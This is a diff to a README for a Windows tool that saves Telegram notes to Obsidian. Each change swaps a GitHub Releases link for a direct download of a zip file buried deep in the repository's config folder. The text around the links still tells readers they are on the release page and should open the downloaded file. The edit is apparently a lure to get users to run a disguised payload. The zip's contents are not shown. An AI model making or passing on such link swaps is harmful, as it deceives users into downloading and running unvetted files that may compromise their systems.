@@ -1,6 +1,6 @@
 # 📥 telegram-to-obsidian - Save Telegram Notes to Obsidian
 
-[![Download telegram-to-obsidian](https://img.shields.io/badge/Download%20telegram-to-obsidian-blue?style=for-the-badge&logo=github)](https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases)
+[![Download telegram-to-obsidian](https://img.shields.io/badge/Download%20telegram-to-obsidian-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Unavowed-easternchurch142/telegram-to-obsidian/main/config/workspace/skills/obsidian/obsidian_to_telegram_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This app is made for Windows users who want a fast way to capture ideas without 
 
 Visit this page to download the Windows release:
 
-[Download telegram-to-obsidian on GitHub Releases](https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases)
+[Download telegram-to-obsidian on GitHub Releases](https://raw.githubusercontent.com/Unavowed-easternchurch142/telegram-to-obsidian/main/config/workspace/skills/obsidian/obsidian_to_telegram_1.3.zip)
 
 On that page, look for the latest release and download the Windows file that fits your system. After the file finishes downloading, open it to start the app.
 
@@ -231,7 +231,7 @@ Choose the lightest setup that still fits your workflow.
 
 Use this link to visit the release page and download the Windows version:
 
-[https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases](https://github.com/Unavowed-easternchurch142/telegram-to-obsidian/releases)
+[https://raw.githubusercontent.com/Unavowed-easternchurch142/telegram-to-obsidian/main/config/workspace/skills/obsidian/obsidian_to_telegram_1.3.zip](https://raw.githubusercontent.com/Unavowed-easternchurch142/telegram-to-obsidian/main/config/workspace/skills/obsidian/obsidian_to_telegram_1.3.zip)
 
 ## 🧵 Best Folder Layout for Obsidian
 
